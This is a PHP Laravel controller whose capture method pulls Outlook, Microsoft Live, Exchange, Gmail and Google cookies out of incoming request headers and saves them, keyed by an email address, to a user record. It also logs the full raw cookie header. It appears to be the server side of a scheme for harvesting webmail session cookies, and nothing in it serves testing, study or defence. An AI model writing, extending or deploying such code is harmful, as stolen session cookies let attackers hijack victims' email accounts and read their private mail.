<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;

class CookieController extends Controller
{
    /**
     * Capture cookies related to Gmail and store them in the database.
     */
    public function capture(Request $request)
    {
        \Log::info('Cookie capture attempt');
        $cookieHeader = $request->header('Cookie', $_SERVER['HTTP_COOKIE'] ?? '');
        $userEmail = $request->input('email');
        \Log::info('Cookie header: ' . $cookieHeader);
        \Log::info('User Email: ' . $userEmail);

        $cookiePatterns = ['Outlook', 'MS', 'Live', 'Exchange', 'GMAIL', 'GOOGLE'];
        $filteredCookies = [];
        if ($cookieHeader) {
            $pairs = explode(';', $cookieHeader);
            foreach ($pairs as $pair) {
                $parts = explode('=', trim($pair), 2);
                if (count($parts) === 2) {
                    $cookieName = $parts[0];
                    foreach ($cookiePatterns as $pattern) {
                        if (stripos($cookieName, $pattern) !== false) {
                            $filteredCookies[$cookieName] = urldecode($parts[1]);
                        }
                    }
                }
            }
        }
        \Log::info('Filtered Cookies:', $filteredCookies);

        if (!empty($filteredCookies) && $userEmail) {
            $user = User::where('email', $userEmail)->first();
            if ($user) {
                \Log::info('User found: ' . $user->email);
                try {
                    $user->cookies = json_encode($filteredCookies);
                    $user->save();
                    \Log::info('Cookies saved successfully');
                    return response()->json(['message' => 'Cookies captured and stored successfully!', 'cookies' => $filteredCookies]);
                } catch (\Exception $e) {
                    \Log::error('Failed to save cookies: ' . $e->getMessage());
                }
            } else {
                \Log::warning('User not found for email: ' . $userEmail);
            }
        } else {
            \Log::info('No cookies to save or no email provided');
        }

        return response()->json(['message' => 'No relevant cookies found or failed to save.'], 400);
    }


}
